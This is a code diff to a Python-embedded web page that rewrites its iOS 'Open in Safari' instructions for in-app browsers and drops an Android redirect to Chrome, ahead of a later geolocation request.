@@ -66,19 +66,27 @@ html = """
 
         if (isInAppBrowser()) {
             if (isiOS()) {
-                // Show instructions instead of broken deep link
-                document.body.innerHTML = `
-                    <div style='padding:50px; text-align:center; font-family:Arial;'>
-                        <h2>Open in Safari</h2>
-                        <p>To continue, tap the <b>•••</b> menu and select <b>"Open in Safari"</b>.</p>
-                    </div>
-                `;
-                return;
-            } else {
-                // Android deep link to Chrome
-                window.location = "intent://" + url.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end";
-                return;
-            }
+    document.body.innerHTML = `
+        <div style="padding:30px; text-align:center; font-family:Arial;">
+            <h2 style="color:#e53935; margin-bottom:20px;">Open in Safari</h2>
+            <p style="font-size:16px; margin-bottom:20px;">
+                To continue, please open this page in Safari:
+            </p>
+            <img src="https://i.ibb.co/N2FFcyW/ios-messenger-menu.png" alt="Open in Safari" 
+                style="max-width:80%; border:1px solid #ccc; border-radius:8px; margin-bottom:20px;">
+            <ol style="text-align:left; max-width:300px; margin:0 auto 20px auto; font-size:16px; line-height:1.5;">
+                <li>Tap the <b>•••</b> menu at the bottom-right.</li>
+                <li>Select <b>"Open in Safari"</b>.</li>
+            </ol>
+            <button onclick="window.open(window.location.href, '_blank')" 
+                style="margin-top:20px; padding:12px 20px; background:#e53935; color:white; border:none; border-radius:6px; font-size:16px; cursor:pointer;">
+                Open in Safari
+            </button>
+        </div>
+    `;
+    return;
+}
+
         }
 
         // If in a normal browser (Safari/Chrome), request geolocation
